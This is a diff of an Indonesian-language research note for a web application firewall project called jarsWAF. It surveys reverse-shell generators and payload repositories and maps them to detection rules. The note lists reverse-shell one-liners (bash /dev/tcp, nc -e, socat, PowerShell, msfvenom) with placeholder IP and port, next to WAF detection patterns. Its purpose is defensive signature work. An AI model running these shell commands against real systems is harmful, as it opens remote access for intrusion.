@@ -28,25 +28,23 @@ cssclasses:
 ## RevShells.com
 
 ### URL
-
 [https://www.revshells.com/](https://www.revshells.com/)
 
 ### Deskripsi
-
 Generator reverse shell online yang menyediakan payload dalam 20+ format berbeda. Cukup masukkan IP dan port, pilih tipe shell, dan dapatkan command siap pakai.
 
 ### Format Payload yang Tersedia
 
-| Kategori       | Contoh                                                                           | Deteksi WAF                                  |
-| -------------- | -------------------------------------------------------------------------------- | -------------------------------------------- |
-| **Bash**       | `bash -i >& /dev/tcp/IP/PORT 0>&1`                                               | Base64 encoded version lebih sulit dideteksi |
-| **Python**     | `python -c 'import socket...'`                                                   | `socket`, `subprocess`, `pty` dalam body     |
-| **PHP**        | `php -r '$sock=fsockopen(IP,PORT);...'`                                          | `fsockopen`, `exec`, `shell_exec`            |
-| **Netcat**     | `nc -e /bin/sh IP PORT`                                                          | `nc -e`, `ncat`                              |
-| **PowerShell** | `powershell -NoP -NonI -W Hidden -Exec Bypass -Command ...`                      | `-EncodedCommand`, `IEX`, `DownloadString`   |
-| **MSFVenom**   | `msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf` | Binary payload — harder to detect via regex  |
-| **Socat**      | `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:IP:PORT`                | `socat` + `exec` + TCP/UDP                   |
-| **Telnet**     | `telnet IP PORT                                                                  | /bin/bash                                    | telnet IP PORT` | `telnet` dengan pipe |
+| Kategori | Contoh | Deteksi WAF |
+|---|---|---|
+| **Bash** | `bash -i >& /dev/tcp/IP/PORT 0>&1` | Base64 encoded version lebih sulit dideteksi |
+| **Python** | `python -c 'import socket...'` | `socket`, `subprocess`, `pty` dalam body |
+| **PHP** | `php -r '$sock=fsockopen(IP,PORT);...'` | `fsockopen`, `exec`, `shell_exec` |
+| **Netcat** | `nc -e /bin/sh IP PORT` | `nc -e`, `ncat` |
+| **PowerShell** | `powershell -NoP -NonI -W Hidden -Exec Bypass -Command ...` | `-EncodedCommand`, `IEX`, `DownloadString` |
+| **MSFVenom** | `msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf` | Binary payload — harder to detect via regex |
+| **Socat** | `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:IP:PORT` | `socat` + `exec` + TCP/UDP |
+| **Telnet** | `telnet IP PORT | /bin/bash | telnet IP PORT` | `telnet` dengan pipe |
 
 ### Pola Deteksi untuk WAF
 
@@ -70,31 +68,29 @@ socat.*exec.*tcp
 ## PayloadsAllTheThings
 
 ### URL
-
 [https://github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
 
 ### Deskripsi
-
 Repositori komprehensif (79.5K stars) berisi payload dan teknik bypass untuk penetration testing web. Setiap kategori memiliki README.md, file untuk Burp Intruder, dan gambar penjelasan.
 
 ### Struktur Kategori
 
-| Kategori                           | Relevansi WAF                          | Implementasi di jarsWAF                  |
-| ---------------------------------- | -------------------------------------- | ---------------------------------------- |
-| **SQL Injection**                  | Tinggi — berbagai teknik bypass filter | `src/rules/sql_injection.rs`             |
-| **Command Injection**              | Tinggi — OOB, blind, encoded           | `src/rules/body.rs` (CMDI-001/002)       |
-| **XSS Injection**                  | Tinggi — polyglot, dom-based           | `src/rules/evasion.rs`                   |
-| **File Inclusion (LFI/RFI)**       | Tinggi — path traversal + wrapper      | `src/rules/headers.rs`                   |
-| **Server Side Request Forgery**    | Sedang — SSRF via URL parsing          | `src/rules/api.rs`                       |
-| **Server Side Template Injection** | Tinggi — RCE via template engine       | `src/rules/body.rs` (SSTI-001/002)       |
-| **Reverse Proxy Misconfig**        | Tinggi — smuggling, bypass             | `src/rules/body.rs` (SMUGGLE-001/002)    |
-| **Upload Insecure Files**          | Tinggi — webshell, extension bypass    | `src/rules/body.rs` (UPLOAD-001/002/003) |
-| **XXE Injection**                  | Tinggi — blind OOB XXE                 | `src/rules/body.rs` (XXE-001/002)        |
-| **JWT Attacks**                    | Sedang — alg confusion, kid injection  | `src/rules/api_security.rs`              |
-| **Prototype Pollution**            | Rendah — JavaScript-specific           | Belum ada                                |
-| **NoSQL Injection**                | Sedang — MongoDB payload               | Belum ada                                |
-| **GraphQL Injection**              | Sedang — introspection, batching       | `src/rules/graphql.rs`                   |
-| **Web Cache Deception**            | Rendah                                 | Belum ada                                |
+| Kategori | Relevansi WAF | Implementasi di jarsWAF |
+|---|---|---|
+| **SQL Injection** | Tinggi — berbagai teknik bypass filter | `src/rules/sql_injection.rs` |
+| **Command Injection** | Tinggi — OOB, blind, encoded | `src/rules/body.rs` (CMDI-001/002) |
+| **XSS Injection** | Tinggi — polyglot, dom-based | `src/rules/evasion.rs` |
+| **File Inclusion (LFI/RFI)** | Tinggi — path traversal + wrapper | `src/rules/headers.rs` |
+| **Server Side Request Forgery** | Sedang — SSRF via URL parsing | `src/rules/api.rs` |
+| **Server Side Template Injection** | Tinggi — RCE via template engine | `src/rules/body.rs` (SSTI-001/002) |
+| **Reverse Proxy Misconfig** | Tinggi — smuggling, bypass | `src/rules/body.rs` (SMUGGLE-001/002) |
+| **Upload Insecure Files** | Tinggi — webshell, extension bypass | `src/rules/body.rs` (UPLOAD-001/002/003) |
+| **XXE Injection** | Tinggi — blind OOB XXE | `src/rules/body.rs` (XXE-001/002) |
+| **JWT Attacks** | Sedang — alg confusion, kid injection | `src/rules/api_security.rs` |
+| **Prototype Pollution** | Rendah — JavaScript-specific | Belum ada |
+| **NoSQL Injection** | Sedang — MongoDB payload | Belum ada |
+| **GraphQL Injection** | Sedang — introspection, batching | `src/rules/graphql.rs` |
+| **Web Cache Deception** | Rendah | Belum ada |
 
 ### Implementasi di jarsWAF
 
@@ -176,7 +172,6 @@ condition_value = "(?i)(fsockopen\\s*\\(|shell_exec\\s*\\(.*(bash|sh))"
 - jarsWAF: `/mnt/data_d/Projects/jarswaf/`
 
 **Cross-link vault:**
-
 - [[waf-reverse-proxy-deepdive]] — arsitektur WAF
 - [[ctf-tool-arsenal-universal]] — tool arsenal
 - [[hierarchy-waf-reverse-proxy]] — WAF ontology
